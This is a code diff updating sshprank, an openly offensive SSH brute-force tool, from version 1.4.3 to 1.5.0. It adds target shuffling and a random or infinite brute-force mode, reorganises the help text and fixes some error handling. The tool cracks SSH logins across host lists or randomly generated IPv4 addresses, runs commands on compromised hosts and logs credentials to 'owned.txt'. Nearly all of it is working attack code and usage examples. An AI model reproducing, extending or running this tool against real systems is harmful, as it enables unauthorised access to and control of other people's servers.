@@ -38,7 +38,7 @@ from collections import deque
 
 
 __author__ = 'noptrix'
-__version__ = '1.4.3'
+__version__ = '1.5.0'
 __copyright = 'santa clause'
 __license__ = 'MIT'
 
@@ -67,7 +67,7 @@ HELP = BOLD + '''usage''' + NORM + '''
 
   sshprank <mode> [opts] | <misc>
 
-''' + BOLD + '''modes''' + NORM + '''
+''' + BOLD + '''mode options''' + NORM + '''
 
   -h <hosts[:ports]>    - single host or host list to crack. multiple ports
                           can be separated by comma, e.g.: 127.0.0.1:22,222,2022
@@ -93,31 +93,53 @@ HELP = BOLD + '''usage''' + NORM + '''
                           format: <host>[:ports]. multiple ports can be
                           separated by comma (default port: 22)
 
-''' + BOLD + '''options''' + NORM + '''
+''' + BOLD + '''scan options''' + NORM + '''
 
   -r <num>              - generate <num> random ipv4 addresses, check for open
                           sshd port and crack for login (only with -m option!)
+
+''' + BOLD + '''credential options''' + NORM + '''
+
   -u <user|file>        - single username or user list (default: root)
   -p <pass|file>        - single password or password list (default: root)
   -c <file>             - list of user:pass combination
+
+''' + BOLD + '''brute options''' + NORM + '''
+
+  -e                    - exclude host after first login was found. continue
+                          with other hosts instead
+  -E                    - exit sshprank completely after first login was found
+  -z                    - shuffle target list randomly before cracking
+                          (only with -h <file>). saves to 'random_targets.txt'
+  -Z <num>              - random brute: pick random target + creds each attempt.
+                          <num> total attempts, 0 = infinite (use with -h, -u/-p)
+
+''' + BOLD + '''exec options''' + NORM + '''
+
   -C <cmd|file>         - read commands from file (line by line) or execute a
                           single command on host if login was cracked
   -N                    - do not output ssh command results
+
+''' + BOLD + '''thread options''' + NORM + '''
+
   -x <num>              - num threads for parallel host crack (default: 50)
   -S <num>              - num threads for parallel service crack (default: 20)
   -X <num>              - num threads for parallel login crack (default: 5)
   -B <num>              - num threads for parallel banner grabbing (default: 70)
+
+''' + BOLD + '''timeout options''' + NORM + '''
+
   -T <sec>              - num sec for auth and connect timeout (default: 5s)
   -R <sec>              - num sec for (banner) read timeout (default: 3s)
+
+''' + BOLD + '''output options''' + NORM + '''
+
   -o <file>             - write found logins to file. format:
                           <host>:<port>:<user>:<pass> (default: owned.txt)
-  -e                    - exclude host after first login was found. continue
-                          with other hosts instead
-  -E                    - exit sshprank completely after first login was found
   -v                    - verbose mode. show found logins, sshds, etc.
                           (default: off)
 
-''' + BOLD + '''misc''' + NORM + '''
+''' + BOLD + '''misc options''' + NORM + '''
 
   -H                    - print help
   -V                    - print version information
@@ -125,7 +147,7 @@ HELP = BOLD + '''usage''' + NORM + '''
 ''' + BOLD + '''examples''' + NORM + '''
 
   # crack targets from a given list with user admin, pw-list and 20 host-threads
-  $ sshprank -h sshds.txt -u admin -P /tmp/passlist.txt -x 20
+  $ sshprank -h sshds.txt -u admin -p /tmp/passlist.txt -x 20
 
   # first scan then crack from founds ssh services using 'root:admin'
   $ sudo sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \\
@@ -141,6 +163,15 @@ HELP = BOLD + '''usage''' + NORM + '''
 
   # grab banners and output to file with format supported for '-h' option
   $ sshprank -b hosts.txt > sshds2.txt
+
+  # shuffle target list and crack
+  $ sshprank -h sshds.txt -z -u root -p /tmp/passes.txt
+
+  # random brute: 500 random attempts from ip/user/pass lists
+  $ sshprank -h sshds.txt -u /tmp/users.txt -p /tmp/passes.txt -Z 500
+
+  # random brute infinite (ctrl+c to stop)
+  $ sshprank -h sshds.txt -u /tmp/users.txt -p /tmp/passes.txt -Z 0
 '''
 
 stargets = []   # shodan
@@ -167,6 +198,8 @@ opts = {
   'logfile': 'owned.txt',
   'exclude': False,
   'exit': False,
+  'shuffle': False,
+  'randbrute': None,
   'verbose': False
 }
 
@@ -235,7 +268,7 @@ def parse_cmdline(cmdline):
 
   try:
     _opts, _args = getopt.getopt(cmdline,
-      'h:m:s:b:r:u:p:c:C:Nx:S:X:B:T:R:o:eEvVH')
+      'h:m:s:b:r:u:p:c:C:Nx:S:X:B:T:R:o:eEzZ:vVH')
     for o, a in _opts:
       if o == '-h':
         if os.path.isfile(a):
@@ -284,6 +317,10 @@ def parse_cmdline(cmdline):
         opts['exclude'] = True
       if o == '-E':
         opts['exit'] = True
+      if o == '-z':
+        opts['shuffle'] = True
+      if o == '-Z':
+        opts['randbrute'] = int(a)
       if o == '-v':
         opts['verbose'] = True
       if o == '-V':
@@ -332,14 +369,14 @@ def check_argc(cmdline):
 
 
 def grab_banner(host, port):
+  s = None
   try:
-    with socket.create_connection((host, port), opts['ctimeout']) as s:
-      s.settimeout(opts['rtimeout'])
-      banner = str(s.recv(1024).decode('utf-8')).strip()
-      if not banner:
-        banner = '<NO BANNER>'
-      log(f'{host}:{port}:{banner}\n')
-      s.settimeout(None)
+    s = socket.create_connection((host, port), opts['ctimeout'])
+    s.settimeout(opts['rtimeout'])
+    banner = str(s.recv(1024).decode('utf-8')).strip()
+    if not banner:
+      banner = '<NO BANNER>'
+    log(f'{host}:{port}:{banner}\n')
   except socket.timeout:
     if opts['verbose']:
       log(f'socket timeout: {host}:{port}', 'warn')
@@ -347,7 +384,8 @@ def grab_banner(host, port):
     if opts['verbose']:
       log(f'could not connect: {host}:{port}', 'warn')
   finally:
-    s.close()
+    if s:
+      s.close()
 
   return
 
@@ -454,10 +492,11 @@ def crack_login(host, port, username, password):
         os._exit(SUCCESS)
       return SUCCESS
   except paramiko.AuthenticationException as err:
+    if 'publickey' in str(err):
+      excluded[host].add(port)
     if opts['verbose']:
       if 'publickey' in str(err):
         reason = 'pubkey auth'
-        excluded[host].add(port)
       elif 'Authentication failed' in str(err):
         reason = 'auth failed'
       elif 'Authentication timeout' in str(err):
@@ -465,20 +504,16 @@ def crack_login(host, port, username, password):
       else:
         reason = 'unknown'
       log(f'login failure: {host}:{port} ({reason})', 'warn')
-    else:
-      pass
   except (paramiko.ssh_exception.NoValidConnectionsError, socket.error):
     if opts['verbose']:
       log(f'could not connect: {host}:{port}', 'warn')
     excluded[host].add(port)
   except paramiko.SSHException as err:
-    #if opts['verbose']:
-    #  log(f'paramiko: {str(err)}', 'warn')
-    pass
+    if opts['verbose']:
+      log(f'ssh error: {host}:{port} ({str(err)})', 'warn')
   except Exception as err:
-    #if opts['verbose']:
-    #  log(f'other error: {str(err)}', 'warn')
-    pass
+    if opts['verbose']:
+      log(f'other error: {host}:{port} ({str(err)})', 'warn')
   finally:
     cli.close()
 
@@ -495,32 +530,27 @@ def run_threads(host, ports, val='single'):
       if port not in excluded[host]:
         e.submit(crack_login, host, port, opts['user'], opts['pass'])
 
-    with ThreadPoolExecutor(opts['lthreads']) as exe:
-      if 'userlist' in opts and 'passlist' in opts:
-        for u in opts['userlist']:
+      with ThreadPoolExecutor(opts['lthreads']) as exe:
+        if 'userlist' in opts and 'passlist' in opts:
+          for u in opts['userlist']:
+            for p in opts['passlist']:
+              exe.submit(crack_login, host, port, u.rstrip(), p.rstrip())
+
+        if 'userlist' in opts and 'passlist' not in opts:
+          for u in opts['userlist']:
+            exe.submit(crack_login, host, port, u.rstrip(), opts['pass'])
+
+        if 'passlist' in opts and 'userlist' not in opts:
           for p in opts['passlist']:
-            exe.submit(crack_login, host, port, u.rstrip(), p.rstrip())
+            exe.submit(crack_login, host, port, opts['user'], p.rstrip())
 
-      if 'userlist' in opts and 'passlist' not in opts:
-        for u in opts['userlist']:
-          exe.submit(crack_login, host, port, u.rstrip(), opts['pass'])
-
-      if 'passlist' in opts and 'userlist' not in opts:
-        for p in opts['passlist']:
-          exe.submit(crack_login, host, port, opts['user'], p.rstrip())
-
-      if 'combolist' in opts:
-        for line in opts['combolist']:
-          try:
-            l = line.split(':')
-            exe.submit(crack_login, host, port, l[0].rstrip(), l[1].rstrip())
-          except IndexError:
-            log('combo list format: <user>:<pass>', 'error')
-
-      if opts['exit']:
-        for x in as_completed(futures):
-          if x.result() == SUCCESS:
-            os._exit(SUCCESS)
+        if 'combolist' in opts:
+          for line in opts['combolist']:
+            try:
+              l = line.split(':')
+              exe.submit(crack_login, host, port, l[0].rstrip(), l[1].rstrip())
+            except IndexError:
+              log('combo list format: <user>:<pass>', 'error')
 
   return
 
@@ -533,6 +563,55 @@ def gen_ipv4addr():
       return str(ip)
   except:
     pass
+
+  return
+
+
+def shuffle_targets():
+  try:
+    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
+      lines = f.readlines()
+    random.shuffle(lines)
+    shuffled = 'random_targets.txt'
+    with open(shuffled, 'w', encoding='latin-1') as f:
+      f.writelines(lines)
+    opts['targetlist'] = shuffled
+    log(f'shuffled {len(lines)} targets -> {shuffled}', 'info')
+  except (FileNotFoundError, PermissionError) as err:
+    log(f'{err.args[1].lower()}: {opts["targetlist"]}', 'error')
+
+  return
+
+
+def crack_rand_brute():
+  global excluded
+
+  try:
+    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
+      hosts = [line.rstrip() for line in f if line.strip()]
+  except (FileNotFoundError, PermissionError) as err:
+    log(f'{err.args[1].lower()}: {opts["targetlist"]}', 'error')
+    return
+
+  users = opts.get('userlist', [opts['user']])
+  passwords = opts.get('passlist', [opts['pass']])
+  count = opts['randbrute']
+  i = 0
+
+  while count == 0 or i < count:
+    batch = opts['hthreads'] if count == 0 else min(opts['hthreads'], count - i)
+    with ThreadPoolExecutor(opts['hthreads']) as exe:
+      for _ in range(batch):
+        target = random.choice(hosts)
+        parsed = parse_target(target)
+        host = list(parsed.keys())[0]
+        port = random.choice(parsed[host])
+        user = random.choice(users).rstrip()
+        passwd = random.choice(passwords).rstrip()
+        if host not in excluded:
+          excluded[host] = set()
+        exe.submit(crack_login, host, port, user, passwd)
+    i += batch
 
   return
 
@@ -600,14 +679,14 @@ def crack_scan():
 
 def check_banners():
   try:
-    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
+    with open(opts['targetlist'], 'r', encoding='latin-1') as fh:
       with ThreadPoolExecutor(opts['bthreads']) as exe:
-        for line in f:
+        for line in fh:
           target = parse_target(line)
           host = ''.join([*target])
           ports = target.get(host)
           for port in ports:
-            f = exe.submit(grab_banner, host, port)
+            exe.submit(grab_banner, host, port)
   except (FileNotFoundError, PermissionError) as err:
     log(f"{err.args[1].lower()}: {opts['targetlist']}", 'error')
 
@@ -665,7 +744,6 @@ def main(cmdline):
   check_argc(cmdline)
   parse_cmdline(cmdline)
   check_argv(cmdline)
-  futures = deque()
 
   log('game started', 'info')
   try:
@@ -673,10 +751,17 @@ def main(cmdline):
       log('cracking single target', 'info')
       crack_single()
     elif len(opts['targetlist']) > 0 and '-b' not in cmdline:
-      with ThreadPoolExecutor(1) as e:
-        future = e.submit(crack_multi)
-        status(future, 'cracking multiple targets\r')
-      log('\n')
+      if opts['shuffle']:
+        shuffle_targets()
+      if opts['randbrute'] is not None:
+        label = 'infinite' if opts['randbrute'] == 0 else str(opts['randbrute'])
+        log(f'random brute mode ({label} attempts)', 'info')
+        crack_rand_brute()
+      else:
+        with ThreadPoolExecutor(1) as e:
+          future = e.submit(crack_multi)
+          status(future, 'cracking multiple targets\r')
+        log('\n')
     elif '-m' in cmdline:
       if is_root():
         if '-r' in cmdline:
